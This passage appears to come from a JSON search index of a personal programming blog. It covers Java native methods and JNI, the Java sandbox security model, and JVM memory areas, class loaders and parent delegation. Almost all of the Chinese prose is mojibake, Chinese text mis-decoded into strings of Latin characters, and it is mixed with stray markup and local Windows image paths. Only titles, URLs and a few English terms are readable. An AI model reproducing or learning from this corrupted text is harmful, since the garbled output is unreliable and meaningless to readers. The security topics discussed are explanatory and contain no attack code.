Isolation.READ_COMMITTED:è¯»å·²æäº¤,Oracleé»˜è®¤çš„éš”ç¦»çº§åˆ«,å¼€å‘æ—¶é€šå¸¸ä½¿ç”¨çš„éš”ç¦»çº§åˆ«","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"Native method?","slug":"Nativeæ–¹æ³•","date":"2020-12-15T08:58:42.000Z","updated":"2021-04-11T17:11:28.345Z","comments":true,"path":"Nativeæ–¹æ³•/","link":"","permalink":"https://blog.kayleh.top/Native%E6%96%B9%E6%B3%95/","excerpt":"","text":"Native æ–¹æ³•?ç¿»çœ‹Thread.start()æºç ,ç«Ÿç„¶å‡ºç°äº†æ— æ–¹æ³•ä½“çš„æ–¹æ³•?? private native void start0(); è¿™é‡Œå…¶å®ç”¨åˆ°äº†å…³é”®å­—native nativeå…³é”®å­— è¯´æ˜javaçš„ä½œç”¨èŒƒå›´è¾¾ä¸åˆ°äº†,å›å»è°ƒç”¨åº•å±‚Cè¯­è¨€çš„åº“. ä½¿ç”¨nativeå…³é”®å­—ä¼šè¿›å…¥æœ¬åœ°æ–¹æ³•æ ˆ,è°ƒç”¨æœ¬åœ°æ–¹æ³•æ¥å£JNI(Java Native Interface) JNIçš„ä½œç”¨: æ‰©å±•Javaçš„ä½¿ç”¨,èåˆä¸åŒçš„ç¼–ç¨‹è¯­è¨€ä¸ºJavaæ‰€ç”¨ å®ƒåœ¨å†…å­˜åŒºåŸŸä¸­ä¸“é—¨å¼€è¾Ÿäº†ä¸€å—æ ‡è®°åŒºåŸŸ: Native Method Stack,ç™»è®°Nativeæ–¹æ³•. åœ¨æœ€ç»ˆæ‰§è¡Œçš„æ—¶å€™,åŠ è½½æœ¬åœ°æ–¹æ³•åº“ä¸­çš„æ–¹æ³•é€šè¿‡JNI æœ¬åœ°æ–¹æ³•çš„ä½¿ç”¨å°‘è§. Javaä½¿ç”¨æ‰“å°æœº,currentTimeMills( ),åšå¤–æŒ‚çš„Robot( )â€¦","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"}]},{"title":"æ²™ç®±å®‰å…¨æœºåˆ¶","slug":"æ²™ç®±å®‰å…¨æœºåˆ¶","date":"2020-12-15T08:58:23.000Z","updated":"2021-04-11T17:11:28.937Z","comments":true,"path":"æ²™ç®±å®‰å…¨æœºåˆ¶/","link":"","permalink":"https://blog.kayleh.top/%E6%B2%99%E7%AE%B1%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","excerpt":"","text":"ä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿ Javaå®‰å…¨æ¨¡å‹çš„æ ¸å¿ƒå°±æ˜¯Javaæ²™ç®±ï¼ˆsandboxï¼‰ï¼Œä»€ä¹ˆæ˜¯æ²™ç®±ï¼Ÿæ²™ç®±æ˜¯ä¸€ä¸ªé™åˆ¶ç¨‹åºè¿è¡Œçš„ç¯å¢ƒã€‚æ²™ç®±æœºåˆ¶å°±æ˜¯å°† Java ä»£ç é™å®šåœ¨è™šæ‹Ÿæœº(JVM)ç‰¹å®šçš„è¿è¡ŒèŒƒå›´ä¸­ï¼Œå¹¶ä¸”ä¸¥æ ¼é™åˆ¶ä»£ç å¯¹æœ¬åœ°ç³»ç»Ÿèµ„æºè®¿é—®ï¼Œé€šè¿‡è¿™æ ·çš„æªæ–½æ¥ä¿è¯å¯¹ä»£ç çš„æœ‰æ•ˆéš”ç¦»ï¼Œé˜²æ­¢å¯¹æœ¬åœ°ç³»ç»Ÿé€ æˆç ´åã€‚æ²™ç®±ä¸»è¦é™åˆ¶ç³»ç»Ÿèµ„æºè®¿é—®ï¼Œé‚£ç³»ç»Ÿèµ„æºåŒ…æ‹¬ä»€ä¹ˆï¼Ÿâ€”â€”CPUã€å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€‚ä¸åŒçº§åˆ«çš„æ²™ç®±å¯¹è¿™äº›èµ„æºè®¿é—®çš„é™åˆ¶ä¹Ÿå¯ä»¥ä¸ä¸€æ ·ã€‚ æ‰€æœ‰çš„Javaç¨‹åºè¿è¡Œéƒ½å¯ä»¥æŒ‡å®šæ²™ç®±ï¼Œå¯ä»¥å®šåˆ¶å®‰å…¨ç­–ç•¥ã€‚ ### javaä¸­çš„å®‰å…¨æ¨¡å‹ï¼š åœ¨Javaä¸­å°†æ‰§è¡Œç¨‹åºåˆ†æˆæœ¬åœ°ä»£ç å’Œè¿œç¨‹ä»£ç ä¸¤ç§ï¼Œæœ¬åœ°ä»£ç é»˜è®¤è§†ä¸ºå¯ä¿¡ä»»çš„ï¼Œè€Œè¿œç¨‹ä»£ç åˆ™è¢«çœ‹ä½œæ˜¯ä¸å—ä¿¡çš„ã€‚å¯¹äºæˆä¿¡çš„æœ¬åœ°ä»£ç ï¼Œå¯ä»¥è®¿é—®ä¸€åˆ‡æœ¬åœ°èµ„æºã€‚è€Œå¯¹äºéæˆä¿¡çš„è¿œç¨‹ä»£ç åœ¨æ—©æœŸçš„Javaå®ç°ä¸­ï¼Œå®‰å…¨ä¾èµ–äºæ²™ç®± (Sandbox) æœºåˆ¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º ![JDK1.0å®‰å…¨æ¨¡å‹](D:\\Blog\\source\\_posts\\æ²™ç®±å®‰å…¨æœºåˆ¶\\1095776-20180111144130504-757642373.gif) ä½†å¦‚æ­¤ä¸¥æ ¼çš„å®‰å…¨æœºåˆ¶ä¹Ÿç»™ç¨‹åºçš„åŠŸèƒ½æ‰©å±•å¸¦æ¥éšœç¢ï¼Œæ¯”å¦‚å½“ç”¨æˆ·å¸Œæœ›è¿œç¨‹ä»£ç è®¿é—®æœ¬åœ°ç³»ç»Ÿçš„æ–‡ä»¶æ—¶å€™ï¼Œå°±æ— æ³•å®ç°ã€‚å› æ­¤åœ¨åç»­çš„ Java1.1 ç‰ˆæœ¬ä¸­ï¼Œé’ˆå¯¹å®‰å…¨æœºåˆ¶åšäº†æ”¹è¿›ï¼Œå¢åŠ äº†å®‰å…¨ç­–ç•¥ï¼Œå…è®¸ç”¨æˆ·æŒ‡å®šä»£ç å¯¹æœ¬åœ°èµ„æºçš„è®¿é—®æƒé™ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º ![JDK1.1å®‰å…¨æ¨¡å‹](D:\\Blog\\source\\_posts\\æ²™ç®±å®‰å…¨æœºåˆ¶\\1095776-20180111144207051-1274870859.gif) åœ¨ Java1.2 ç‰ˆæœ¬ä¸­ï¼Œå†æ¬¡æ”¹è¿›äº†å®‰å…¨æœºåˆ¶ï¼Œå¢åŠ äº†ä»£ç ç­¾åã€‚ä¸è®ºæœ¬åœ°ä»£ç æˆ–æ˜¯è¿œç¨‹ä»£ç ï¼Œéƒ½ä¼šæŒ‰ç…§ç”¨æˆ·çš„å®‰å…¨ç­–ç•¥è®¾å®šï¼Œç”±ç±»åŠ è½½å™¨åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­æƒé™ä¸åŒçš„è¿è¡Œç©ºé—´ï¼Œæ¥å®ç°å·®å¼‚åŒ–çš„ä»£ç æ‰§è¡Œæƒé™æ§åˆ¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º ![JDK1.2å®‰å…¨æ¨¡å‹](D:\\Blog\\source\\_posts\\æ²™ç®±å®‰å…¨æœºåˆ¶\\1095776-20180111144239051-1741250711.gif) å½“å‰æœ€æ–°çš„å®‰å…¨æœºåˆ¶å®ç°ï¼Œåˆ™å¼•å…¥äº†åŸŸ (Domain) çš„æ¦‚å¿µã€‚è™šæ‹Ÿæœºä¼šæŠŠæ‰€æœ‰ä»£ç åŠ è½½åˆ°ä¸åŒçš„ç³»ç»ŸåŸŸå’Œåº”ç”¨åŸŸï¼Œç³»ç»ŸåŸŸéƒ¨åˆ†ä¸“é—¨è´Ÿè´£ä¸å…³é”®èµ„æºè¿›è¡Œäº¤äº’ï¼Œè€Œå„ä¸ªåº”ç”¨åŸŸéƒ¨åˆ†åˆ™é€šè¿‡ç³»ç»ŸåŸŸçš„éƒ¨åˆ†ä»£ç†æ¥å¯¹å„ç§éœ€è¦çš„èµ„æºè¿›è¡Œè®¿é—®ã€‚è™šæ‹Ÿæœºä¸­ä¸åŒçš„å—ä¿æŠ¤åŸŸ (Protected Domain)ï¼Œå¯¹åº”ä¸ä¸€æ ·çš„æƒé™ (Permission)ã€‚å­˜åœ¨äºä¸åŒåŸŸä¸­çš„ç±»æ–‡ä»¶å°±å…·æœ‰äº†å½“å‰åŸŸçš„å…¨éƒ¨æƒé™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º ![æœ€æ–°çš„å®‰å…¨æ¨¡å‹](D:\\Blog\\source\\_posts\\æ²™ç®±å®‰å…¨æœºåˆ¶\\1095776-20180111144309176-1047557575.gif) ä»¥ä¸Šæåˆ°çš„éƒ½æ˜¯åŸºæœ¬çš„ Java å®‰å…¨æ¨¡å‹æ¦‚å¿µï¼Œåœ¨åº”ç”¨å¼€å‘ä¸­è¿˜æœ‰ä¸€äº›å…³äºå®‰å…¨çš„å¤æ‚ç”¨æ³•ï¼Œå…¶ä¸­æœ€å¸¸ç”¨åˆ°çš„ API å°±æ˜¯ doPrivilegedã€‚doPrivileged æ–¹æ³•èƒ½å¤Ÿä½¿ä¸€æ®µå—ä¿¡ä»»ä»£ç è·å¾—æ›´å¤§çš„æƒé™ï¼Œç”šè‡³æ¯”è°ƒç”¨å®ƒçš„åº”ç”¨ç¨‹åºè¿˜è¦å¤šï¼Œå¯åšåˆ°ä¸´æ—¶è®¿é—®æ›´å¤šçš„èµ„æºã€‚æœ‰æ—¶å€™è¿™æ˜¯éå¸¸å¿…è¦çš„ï¼Œå¯ä»¥åº”ä»˜ä¸€äº›ç‰¹æ®Šçš„åº”ç”¨åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½æ— æ³•ç›´æ¥è®¿é—®æŸäº›ç³»ç»Ÿèµ„æºï¼Œä½†è¿™æ ·çš„åº”ç”¨ç¨‹åºå¿…é¡»å¾—åˆ°è¿™äº›èµ„æºæ‰èƒ½å¤Ÿå®ŒæˆåŠŸèƒ½ã€‚ ### ç»„æˆæ²™ç®±çš„åŸºæœ¬ç»„ä»¶ï¼š - å­—èŠ‚ç æ ¡éªŒå™¨ï¼ˆbytecode verifierï¼‰ï¼šç¡®ä¿Javaç±»æ–‡ä»¶éµå¾ªJavaè¯­è¨€è§„èŒƒã€‚è¿™æ ·å¯ä»¥å¸®åŠ©Javaç¨‹åºå®ç°å†…å­˜ä¿æŠ¤ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»æ–‡ä»¶éƒ½ä¼šç»è¿‡å­—èŠ‚ç æ ¡éªŒï¼Œæ¯”å¦‚æ ¸å¿ƒç±»ã€‚ - ç±»è£…è½½å™¨ï¼ˆclass loaderï¼‰ï¼šå…¶ä¸­ç±»è£…è½½å™¨åœ¨3ä¸ªæ–¹é¢å¯¹Javaæ²™ç®±èµ·ä½œç”¨ 1. å®ƒé˜²æ­¢æ¶æ„ä»£ç å»å¹²æ¶‰å–„æ„çš„ä»£ç ï¼› 2. å®ƒå®ˆæŠ¤äº†è¢«ä¿¡ä»»çš„ç±»åº“è¾¹ç•Œï¼› 3. å®ƒå°†ä»£ç å½’å…¥ä¿æŠ¤åŸŸï¼Œç¡®å®šäº†ä»£ç å¯ä»¥è¿›è¡Œå“ªäº›æ“ä½œã€‚ è™šæ‹Ÿæœºä¸ºä¸åŒçš„ç±»åŠ è½½å™¨è½½å…¥çš„ç±»æä¾›ä¸åŒçš„å‘½åç©ºé—´ï¼Œå‘½åç©ºé—´ç”±ä¸€ç³»åˆ—å”¯ä¸€çš„åç§°ç»„æˆï¼Œæ¯ä¸€ä¸ªè¢«è£…è½½çš„ç±»å°†æœ‰ä¸€ä¸ªåå­—ï¼Œè¿™ä¸ªå‘½åç©ºé—´æ˜¯ç”±Javaè™šæ‹Ÿæœºä¸ºæ¯ä¸€ä¸ªç±»è£…è½½å™¨ç»´æŠ¤çš„ï¼Œå®ƒä»¬äº’ç›¸ä¹‹é—´ç”šè‡³ä¸å¯è§ã€‚ ç±»è£…è½½å™¨é‡‡ç”¨çš„æœºåˆ¶æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ã€‚1. ä»æœ€å†…å±‚JVMè‡ªå¸¦ç±»åŠ è½½å™¨å¼€å§‹åŠ è½½ï¼Œå¤–å±‚æ¶æ„åŒåç±»å¾—ä¸åˆ°åŠ è½½ä»è€Œæ— æ³•ä½¿ç”¨ï¼› 2. ç”±äºä¸¥æ ¼é€šè¿‡åŒ…æ¥åŒºåˆ†äº†è®¿é—®åŸŸï¼Œå¤–å±‚æ¶æ„çš„ç±»é€šè¿‡å†…ç½®ä»£ç ä¹Ÿæ— æ³•è·å¾—æƒé™è®¿é—®åˆ°å†…å±‚ç±»ï¼Œç ´åä»£ç å°±è‡ªç„¶æ— æ³•ç”Ÿæ•ˆã€‚ - å­˜å–æ§åˆ¶å™¨ï¼ˆaccess controllerï¼‰ï¼šå­˜å–æ§åˆ¶å™¨å¯ä»¥æ§åˆ¶æ ¸å¿ƒAPIå¯¹æ“ä½œç³»ç»Ÿçš„å­˜å–æƒé™ï¼Œè€Œè¿™ä¸ªæ§åˆ¶çš„ç­–ç•¥è®¾å®šï¼Œå¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šã€‚ - å®‰å…¨ç®¡ç†å™¨ï¼ˆsecurity managerï¼‰ï¼šæ˜¯æ ¸å¿ƒAPIå’Œæ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸»è¦æ¥å£ã€‚å®ç°æƒé™æ§åˆ¶ï¼Œæ¯”å­˜å–æ§åˆ¶å™¨ä¼˜å…ˆçº§é«˜ã€‚ - å®‰å…¨è½¯ä»¶åŒ…ï¼ˆsecurity packageï¼‰ï¼šjava.securityä¸‹çš„ç±»å’Œæ‰©å±•åŒ…ä¸‹çš„ç±»ï¼Œå…è®¸ç”¨æˆ·ä¸ºè‡ªå·±çš„åº”ç”¨å¢åŠ æ–°çš„å®‰å…¨ç‰¹æ€§ï¼ŒåŒ…æ‹¬ï¼š 1. å®‰å…¨æä¾›è€… 2. æ¶ˆæ¯æ‘˜è¦ 3. æ•°å­—ç­¾å 4. åŠ å¯† 5. é‰´åˆ« è¯´ç™½äº†å°±æ˜¯é™åˆ¶è¿œç¨‹ä»£ç æƒé™ å‡å¦‚ä¸€æ®µä»£ç ï¼š public void a() { b(); } public void b() { a(); } è°ƒç”¨è‚¯å®šä¼šæ ˆæº¢å‡º,ä½†æ˜¯å¦‚æœè¿œç¨‹æ¶æ„ä¿®æ”¹æ ˆç©ºé—´å°±ä¼šå¯¼è‡´å†…å­˜æº¢å‡º.","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"}]},{"title":"JVM classloader and parent delegation-mechanism","slug":"JVM-ç±»åŠ è½½å™¨å’ŒåŒäº²å§”æ´¾æœºåˆ¶","date":"2020-12-14T05:28:57.000Z","updated":"2021-04-11T17:11:28.217Z","comments":true,"path":"JVM-ç±»åŠ è½½å™¨å’ŒåŒäº²å§”æ´¾æœºåˆ¶/","link":"","permalink":"https://blog.kayleh.top/JVM-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%92%8C%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/","excerpt":"","text":"JVM-ç±»åŠ è½½å™¨å’ŒåŒäº²å§”æ´¾æœºåˆ¶JVMjavaçš„å…­ç§å­˜å‚¨åœ°å€åŠè§£é‡Š1ï¼‰ å¯„å­˜å™¨(register)ï¼šè¿™æ˜¯æœ€å¿«çš„å­˜å‚¨åŒºï¼Œå› ä¸ºå®ƒä½äºä¸åŒäºå…¶ä»–å­˜å‚¨åŒºçš„åœ°æ–¹â€”â€”å¤„ç†å™¨å†…éƒ¨ã€‚ä½†æ˜¯å¯„å­˜å™¨çš„æ•°é‡æå…¶æœ‰é™ï¼Œæ‰€ä»¥å¯„å­˜å™¨ç”±ç¼–è¯‘å™¨æ ¹æ®éœ€æ±‚è¿›è¡Œåˆ†é…ã€‚ä½ ä¸èƒ½ç›´æ¥æ§åˆ¶ï¼Œä¹Ÿä¸èƒ½åœ¨ç¨‹åºä¸­æ„Ÿè§‰åˆ°å¯„å­˜å™¨å­˜åœ¨çš„ä»»ä½•è¿¹è±¡ã€‚ 2ï¼‰ å †æ ˆ(stack)ï¼šä½äºé€šç”¨RAMä¸­ï¼Œä½†é€šè¿‡å®ƒçš„â€œå †æ ˆæŒ‡é’ˆâ€å¯ä»¥ä»å¤„ç†å™¨å“ªé‡Œè·å¾—æ”¯æŒã€‚å †æ ˆæŒ‡é’ˆè‹¥å‘ä¸‹ç§»åŠ¨ï¼Œåˆ™åˆ†é…æ–°çš„å†…å­˜ï¼›è‹¥å‘ä¸Šç§»åŠ¨ï¼Œåˆ™é‡Šæ”¾é‚£äº›å†…å­˜ã€‚è¿™æ˜¯ä¸€ç§å¿«é€Ÿæœ‰æ•ˆçš„åˆ†é…å­˜å‚¨æ–¹æ³•ï¼Œä»…æ¬¡äºå¯„å­˜å™¨ã€‚åˆ›å»ºç¨‹åºæ—¶å€™ï¼ŒJAVAç¼–è¯‘å™¨å¿…é¡»çŸ¥é“å­˜å‚¨åœ¨å †æ ˆå†…æ‰€æœ‰æ•°æ®çš„ç¡®åˆ‡å¤§å°å’Œç”Ÿå‘½å‘¨æœŸï¼Œå› ä¸ºå®ƒå¿…é¡»ç”Ÿæˆç›¸åº”çš„ä»£ç ï¼Œä»¥ä¾¿ä¸Šä¸‹ç§»åŠ¨å †æ ˆæŒ‡é’ˆã€‚è¿™ä¸€çº¦æŸé™åˆ¶äº†ç¨‹åºçš„çµæ´»æ€§ï¼Œæ‰€ä»¥è™½ç„¶æŸäº›JAVAæ•°æ®å­˜å‚¨åœ¨å †æ ˆä¸­â€”â€”ç‰¹åˆ«æ˜¯å¯¹è±¡å¼•ç”¨ï¼Œä½†æ˜¯JAVAå¯¹è±¡ä¸å­˜å‚¨å…¶ä¸­ã€‚3ï¼‰å †(heap)ï¼šä¸€ç§é€šç”¨æ€§çš„å†…å­˜æ± ï¼ˆä¹Ÿå­˜åœ¨äºRAMä¸­ï¼‰ï¼Œç”¨äºå­˜æ”¾æ‰€æœ‰çš„JAVAå¯¹è±¡ã€‚å †ä¸åŒäºå †æ ˆçš„å¥½å¤„æ˜¯ï¼šç¼–è¯‘å™¨ä¸éœ€è¦çŸ¥é“è¦ä»å †é‡Œåˆ†é…å¤šå°‘å­˜å‚¨åŒºåŸŸï¼Œä¹Ÿä¸å¿…çŸ¥é“å­˜å‚¨çš„æ•°æ®åœ¨å †é‡Œå­˜æ´»å¤šé•¿æ—¶é—´ã€‚å› æ­¤ï¼Œåœ¨å †é‡Œåˆ†é…å­˜å‚¨æœ‰å¾ˆå¤§çš„çµæ´»æ€§ã€‚å½“ä½ éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œåªéœ€è¦newå†™ä¸€è¡Œç®€å•çš„ä»£ç ï¼Œå½“æ‰§è¡Œè¿™è¡Œä»£ç æ—¶ï¼Œä¼šè‡ªåŠ¨åœ¨å †é‡Œè¿›è¡Œå­˜å‚¨åˆ†é…ã€‚å½“ç„¶ï¼Œä¸ºè¿™ç§çµæ´»æ€§å¿…é¡»è¦ä»˜å‡ºç›¸åº”çš„ä»£ç ã€‚ç”¨å †è¿›è¡Œå­˜å‚¨åˆ†é…æ¯”ç”¨å †æ ˆè¿›è¡Œå­˜å‚¨å­˜å‚¨éœ€è¦æ›´å¤šçš„æ—¶é—´ã€‚4ï¼‰é™æ€å­˜å‚¨(static storage)ï¼šè¿™é‡Œçš„â€œé™æ€â€æ˜¯æŒ‡â€œåœ¨å›ºå®šçš„ä½ç½®â€ã€‚é™æ€å­˜å‚¨é‡Œå­˜æ”¾ç¨‹åºè¿è¡Œæ—¶ä¸€ç›´å­˜åœ¨çš„æ•°æ®ã€‚ä½ å¯ç”¨å…³é”®å­—staticæ¥æ ‡è¯†ä¸€ä¸ªå¯¹è±¡çš„ç‰¹å®šå…ƒç´ æ˜¯é™æ€çš„ï¼Œä½†JAVAå¯¹è±¡æœ¬èº«ä»æ¥ä¸ä¼šå­˜æ”¾åœ¨é™æ€å­˜å‚¨ç©ºé—´é‡Œã€‚5ï¼‰ å¸¸é‡å­˜å‚¨(constant storage)ï¼šå¸¸é‡å€¼é€šå¸¸ç›´æ¥å­˜æ”¾åœ¨ç¨‹åºä»£ç å†…éƒ¨ï¼Œè¿™æ ·åšæ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒä»¬æ°¸è¿œä¸ä¼šè¢«æ”¹å˜ã€‚æœ‰æ—¶ï¼Œåœ¨åµŒå…¥å¼ç³»ç»Ÿä¸­ï¼Œå¸¸é‡æœ¬èº«ä¼šå’Œå…¶ä»–éƒ¨åˆ†åˆ†å‰²ç¦»å¼€ï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€‰æ‹©å°†å…¶æ”¾åœ¨ROMä¸­ã€‚6ï¼‰ éRAMå­˜å‚¨ï¼šå¦‚æœæ•°æ®å®Œå…¨å­˜æ´»äºç¨‹åºä¹‹å¤–ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ä¸å—ç¨‹åºçš„ä»»ä½•æ§åˆ¶ï¼Œåœ¨ç¨‹åºæ²¡æœ‰è¿è¡Œæ—¶ä¹Ÿå¯ä»¥å­˜åœ¨ã€‚ æ ˆã€å †ã€æ–¹æ³•åŒºå­˜å‚¨çš„å†…å®¹ å †åŒº:1.å­˜å‚¨çš„å…¨éƒ¨æ˜¯å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½åŒ…å«ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„classçš„ä¿¡æ¯ã€‚(classçš„ç›®çš„æ˜¯å¾—åˆ°æ“ä½œæŒ‡ä»¤)2.jvmåªæœ‰ä¸€ä¸ªå †åŒº(heap)è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«ï¼Œå †ä¸­ä¸å­˜æ”¾åŸºæœ¬ç±»å‹å’Œå¯¹è±¡å¼•ç”¨ï¼Œåªå­˜æ”¾å¯¹è±¡æœ¬èº« ã€‚ æ ˆåŒº:1.æ¯ä¸ªçº¿ç¨‹åŒ…å«ä¸€ä¸ªæ ˆåŒºï¼Œæ ˆä¸­åªä¿å­˜åŸºç¡€æ•°æ®ç±»å‹çš„å€¼å’Œå¯¹è±¡ä»¥åŠåŸºç¡€æ•°æ®çš„å¼•ç”¨2.æ¯ä¸ªæ ˆä¸­çš„æ•°æ®(åŸºç¡€æ•°æ®ç±»å‹å’Œå¯¹è±¡å¼•ç”¨)éƒ½æ˜¯ç§æœ‰çš„ï¼Œå…¶ä»–æ ˆä¸èƒ½è®¿é—®ã€‚3.æ ˆåˆ†ä¸º3ä¸ªéƒ¨åˆ†ï¼šåŸºæœ¬ç±»å‹å˜é‡åŒºã€æ‰§è¡Œç¯å¢ƒä¸Šä¸‹æ–‡ã€æ“ä½œæŒ‡ä»¤åŒº(å­˜æ”¾æ“ä½œæŒ‡ä»¤)ã€‚ æ–¹æ³•åŒº:1.åˆå«é™æ€åŒºï¼Œè·Ÿå †ä¸€æ ·ï¼Œè¢«æ‰€æœ‰çš„çº¿ç¨‹å…±äº«ã€‚æ–¹æ³•åŒºåŒ…å«æ‰€æœ‰çš„classå’Œstaticå˜é‡ã€‚2.æ–¹æ³•åŒºä¸­åŒ…å«çš„éƒ½æ˜¯åœ¨æ•´ä¸ªç¨‹åºä¸­æ°¸è¿œå”¯ä¸€çš„å…ƒç´ ï¼Œå¦‚classï¼Œstaticå˜é‡ã€‚ img JVMåœ¨ä»€ä¹ˆä½ç½®ï¼Ÿåœ¨æ“ä½œç³»ç»Ÿä¹‹ä¸Šã€‚ JRE--JVM\" style=\"zoom: 33%; JVMçš„ä½“ç³»ç»“æ„JVMä½“ç³»ç»“æ„ *æ ˆç”¨å®Œç³»ç»Ÿä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œä¸ä¼šæœ‰åƒåœ¾ æ ˆã€æœ¬åœ°æ–¹æ³•æ ˆã€ç¨‹åºè®¡æ•°å™¨ï¼šç™¾ä¹‹ç™¾æ²¡æœ‰åƒåœ¾ï¼Œä¸ä¼šæœ‰åƒåœ¾å›æ”¶ JVMè°ƒä¼˜ç™¾åˆ†ä¹‹99éƒ½æ˜¯åœ¨è°ƒæ–¹æ³•åŒºå’Œå †ï¼Œè€Œç™¾åˆ†ä¹‹99éƒ½æ˜¯å†è°ƒå † ç±»åŠ è½½å™¨ç±»åŠ è½½å™¨çš„ä½œç”¨ï¼Ÿ åŠ è½½Classæ–‡ä»¶ 1607958651140\" style=\"zoom: 80%; åŠ è½½å™¨åˆ†ä¸º è™šæ‹Ÿæœºè‡ªå¸¦çš„åŠ è½½å™¨ å¯åŠ¨ç±»ï¼ˆæ ¹ï¼‰åŠ è½½å™¨ æ‰©å±•ç±»åŠ è½½å™¨ åº”ç”¨ç¨‹åºåŠ è½½å™¨ ç±»çš„åŠ è½½è¿‡ç¨‹javaä¸­ç±»çš„åŠ è½½æœ‰5ä¸ªè¿‡ç¨‹ï¼ŒåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ï¼› è¿™ä¾¿æ˜¯ç±»åŠ è½½çš„5ä¸ªè¿‡ç¨‹ï¼Œè€Œç±»åŠ è½½å™¨çš„ä»»åŠ¡æ˜¯æ ¹æ®ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è¯»å–æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµåˆ°JVMä¸­ï¼Œç„¶åè½¬æ¢ä¸ºä¸€ä¸ªä¸ç›®æ ‡ç±»å¯¹åº”çš„java.lang.Classå¯¹è±¡å®ä¾‹ï¼Œåœ¨è™šæ‹Ÿæœºæä¾›äº†3ç§ç±»åŠ è½½å™¨ï¼Œå¼•å¯¼ï¼ˆBootstrapï¼‰ç±»åŠ è½½å™¨ã€æ‰©å±•ï¼ˆExtensionï¼‰ç±»åŠ è½½å™¨ã€ç³»ç»Ÿï¼ˆSystemï¼‰ç±»åŠ è½½å™¨ï¼ˆä¹Ÿç§°åº”ç”¨ç±»åŠ è½½å™¨ï¼‰ã€‚ Classæ–‡ä»¶ä¸­çš„â€œç±»â€ä»åŠ è½½åˆ°JVMå†…å­˜ä¸­ï¼Œåˆ°å¸è½½å‡ºå†…å­˜è¿‡ç¨‹æœ‰ä¸ƒä¸ªç”Ÿå‘½å‘¨æœŸé˜¶æ®µã€‚ç±»åŠ è½½æœºåˆ¶åŒ…æ‹¬äº†å‰äº”ä¸ªé˜¶æ®µã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š img å…¶ä¸­ï¼ŒåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€åˆå§‹åŒ–ã€å¸è½½çš„\\å¼€å§‹é¡ºåº**æ˜¯ç¡®å®šçš„ï¼Œæ³¨æ„ï¼Œåªæ˜¯æŒ‰é¡ºåºå¼€å§‹ï¼Œè¿›è¡Œä¸ç»“æŸçš„é¡ºåºå¹¶ä¸ä¸€å®šã€‚è§£æé˜¶æ®µå¯èƒ½åœ¨åˆå§‹åŒ–ä¹‹åå¼€å§‹ã€‚ å¦å¤–ï¼Œç±»åŠ è½½æ— éœ€ç­‰åˆ°ç¨‹åºä¸­â€œé¦–æ¬¡ä½¿ç”¨â€çš„æ—¶å€™æ‰å¼€å§‹ï¼ŒJVMé¢„å…ˆåŠ è½½æŸäº›ç±»ä¹Ÿæ˜¯è¢«å…è®¸çš„ã€‚ï¼ˆ\\ç±»åŠ è½½çš„æ—¶æœº**ï¼‰ 1ã€é€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåï¼ˆåŒ…åä¸ç±»åï¼‰æ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµï¼ˆClassæ–‡ä»¶ï¼‰ã€‚è€Œè·å–çš„æ–¹å¼ï¼Œå¯ä»¥é€šè¿‡jaråŒ…ã€waråŒ…ã€ç½‘ç»œä¸­è·å–ã€JSPæ–‡ä»¶ç”Ÿæˆç­‰æ–¹å¼ã€‚ 2ã€å°†è¿™ä¸ªå­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ã€‚è¿™é‡Œåªæ˜¯è½¬åŒ–äº†æ•°æ®ç»“æ„ï¼Œå¹¶æœªåˆå¹¶æ•°æ®ã€‚ï¼ˆæ–¹æ³•åŒºå°±æ˜¯ç”¨æ¥å­˜æ”¾å·²è¢«åŠ è½½çš„ç±»ä¿¡æ¯ï¼Œå¸¸é‡ï¼Œé™æ€å˜é‡ï¼Œç¼–è¯‘åçš„ä»£ç çš„è¿è¡Œæ—¶å†…å­˜åŒºåŸŸï¼‰ 